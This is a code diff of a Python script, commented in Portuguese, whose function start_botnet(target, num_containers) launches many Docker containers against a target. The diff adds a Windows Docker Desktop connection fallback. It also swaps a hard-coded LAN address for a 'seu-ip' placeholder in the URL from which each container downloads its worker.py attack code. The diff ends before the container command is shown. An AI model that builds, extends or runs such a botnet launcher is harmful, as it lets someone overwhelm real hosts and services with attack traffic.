@@ -2,11 +2,19 @@ import docker
 import time
 import os
 
-client = docker.from_env()
+try:
+    client = docker.from_env()
+except Exception:
+    try:
+        # Fallback específico para Docker Desktop no Windows
+        client = docker.DockerClient(base_url='npipe:////./pipe/docker_engine')
+    except Exception as e:
+        print(f"[!] Erro crítico: Não foi possível conectar ao Docker. Certifique-se que o Docker Desktop está aberto.\nDetalhes: {e}")
+        exit(1)
 
 def start_botnet(target, num_containers):
-    # URL onde o worker.py está hospedado (vou rodar somente no linux, ent o ip vai ser 10.x.x.x)
-    WORKER_URL = "http://192.168.2.144:8000/worker.py" 
+    # URL onde o worker.py está hospedado
+    WORKER_URL = "http://seu-ip:8000/worker.py" 
     
     # Comando que o container executará ao iniciar:
     # 1. Atualiza o sistema e instala python3 e curl
